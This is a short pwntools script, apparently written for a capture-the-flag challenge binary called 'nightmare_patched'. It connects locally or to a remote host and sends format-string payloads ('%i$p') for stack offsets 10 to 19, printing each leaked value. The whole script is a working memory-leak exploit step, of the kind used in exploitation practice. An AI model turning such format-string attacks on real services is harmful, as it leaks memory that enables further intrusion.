from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./nightmare_patched")

def start():
    if args.REMOTE:
        return remote("94.237.59.63", 56187)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

#i = 1
for i in range(10, 20):
    #io = start()
    io.sendlineafter(b"> ", b"2")

    io.sendlineafter(b"Enter the escape code>> ", f"%{i}$p\x00".encode()) # \x00 cuando es arriba de 10
    print(f"[+] {i} : {io.recvline().decode()}")

    #io.close()

io.interactive()
